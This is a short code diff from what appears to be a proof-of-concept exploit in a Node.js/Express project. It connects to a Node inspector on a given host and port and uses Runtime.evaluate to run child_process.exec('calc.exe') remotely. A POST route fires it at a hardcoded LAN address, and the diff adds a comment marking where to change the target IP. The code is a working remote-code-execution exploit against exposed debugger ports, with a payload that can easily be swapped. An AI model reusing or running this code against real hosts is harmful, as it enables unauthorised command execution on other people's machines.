@@ -19,7 +19,6 @@ async function popCalc(host, port) {
   // });
 
   const calcResult = await client.Runtime.evaluate({
-    // expression: "require('child_process').exec('calc.exe');",
     expression: "require('child_process').exec('calc.exe');",
     includeCommandLineAPI: true,
     returnByValue: false,
@@ -39,6 +38,7 @@ router.post('/', function(req, res, next) {
   // Now we need to inspect 'localhost:port'. Cannot do it with the inspector
   // module, it's for running a server and listening.
 
+  // ZZZ Change the IP address here.
   popCalc('192.168.1.130', port);
   res.send('popped calc?');
 });
